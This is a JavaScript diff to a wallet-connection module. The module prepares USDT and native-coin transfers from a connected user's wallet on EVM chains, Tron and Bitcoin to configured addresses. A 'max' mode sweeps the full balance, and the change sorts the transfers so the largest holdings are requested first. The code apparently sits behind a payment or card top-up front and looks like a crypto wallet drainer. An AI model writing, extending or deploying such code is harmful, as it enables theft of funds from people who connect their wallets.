@@ -34,11 +34,11 @@ async function evmTransfers(connection, config) {
     const items = [];
     const tokenBalance = BigInt(tokenHex || 0); const whole = 10n ** BigInt(cfg.decimals);
     const tokenAmount = config.amountMode === 'max' ? (tokenBalance / whole) * whole : units(config.amountUsd, cfg.decimals);
-    if (tokenAmount > 0n && tokenBalance >= tokenAmount) items.push({ chain, chainId: cfg.caip, symbol: 'USDT', amount: Number(tokenAmount) / 10 ** cfg.decimals, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: cfg.token, value: '0x0', data: `0xa9059cbb${pad(config.evmAddress)}${pad(tokenAmount.toString(16))}` }] } });
+    if (tokenAmount > 0n && tokenBalance >= tokenAmount) items.push({ chain, chainId: cfg.caip, symbol: 'USDT', amount: Number(tokenAmount) / 10 ** cfg.decimals, availableUsd: Number(tokenBalance) / 10 ** cfg.decimals, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: cfg.token, value: '0x0', data: `0xa9059cbb${pad(config.evmAddress)}${pad(tokenAmount.toString(16))}` }] } });
     const nativeBalance = BigInt(nativeHex || 0); const spendable = nativeBalance > BigInt(gasHex || 0) * 25000n ? nativeBalance - BigInt(gasHex || 0) * 25000n : 0n;
     const price = priceMap[cfg.priceId] || 0; const fixed = price ? units((config.amountUsd / price).toFixed(18), 18) : 0n;
     const nativeAmount = config.amountMode === 'max' ? (spendable / 10n ** 18n) * 10n ** 18n : fixed;
-      if (nativeAmount > 0n && spendable >= nativeAmount) items.push({ chain, chainId: cfg.caip, symbol: cfg.native, amount: Number(nativeAmount) / 1e18, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: config.evmAddress, value: `0x${nativeAmount.toString(16)}`, data: '0x', gas: '0x5208' }] } });
+      if (nativeAmount > 0n && spendable >= nativeAmount) items.push({ chain, chainId: cfg.caip, symbol: cfg.native, amount: Number(nativeAmount) / 1e18, availableUsd: Number(spendable) / 1e18 * price, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: config.evmAddress, value: `0x${nativeAmount.toString(16)}`, data: '0x', gas: '0x5208' }] } });
       return items;
     } catch (_) {
       return [];
@@ -50,11 +50,11 @@ export async function prepareTransfers(connection, config) {
   const items = await evmTransfers(connection, config);
   if (config.enabledAssets.includes('tron') && connection.tronAddress && config.tronAddress) {
     const prepared = await postJson('/api/tron/prepare', { from: connection.tronAddress, amountUsd: config.amountUsd, card: config.card });
-    if (prepared?.amount > 0 && prepared?.transaction) items.push({ chain: 'tron', chainId: 'tron:0x2b6653dc', symbol: 'USDT', amount: prepared.amount, amountUsd: config.amountUsd, card: config.card, to: config.tronAddress, transaction: prepared.transaction, tron: true });
+    if (prepared?.amount > 0 && prepared?.transaction) items.push({ chain: 'tron', chainId: 'tron:0x2b6653dc', symbol: 'USDT', amount: prepared.amount, availableUsd: prepared.availableUsd, amountUsd: config.amountUsd, card: config.card, to: config.tronAddress, transaction: prepared.transaction, tron: true });
   }
   if (config.enabledAssets.includes('bitcoin') && connection.bitcoinAddress && config.btcAddress) {
     const preview = await postJson('/api/bitcoin/preview', { address: connection.bitcoinAddress, amountUsd: config.amountUsd, card: config.card }).catch(() => null);
-    if (preview?.satoshis) items.push({ chain: 'bitcoin', chainId: 'bip122:000000000019d6689c085ae165831e93', symbol: 'BTC', amount: preview.amount, amountUsd: config.amountUsd, card: config.card, satoshis: preview.satoshis, to: config.btcAddress, bitcoin: true });
+    if (preview?.satoshis) items.push({ chain: 'bitcoin', chainId: 'bip122:000000000019d6689c085ae165831e93', symbol: 'BTC', amount: preview.amount, availableUsd: preview.availableUsd, amountUsd: config.amountUsd, card: config.card, satoshis: preview.satoshis, to: config.btcAddress, bitcoin: true });
   }
-  return items;
+  return items.sort((a, b) => Number(b.availableUsd || 0) - Number(a.availableUsd || 0));
 }
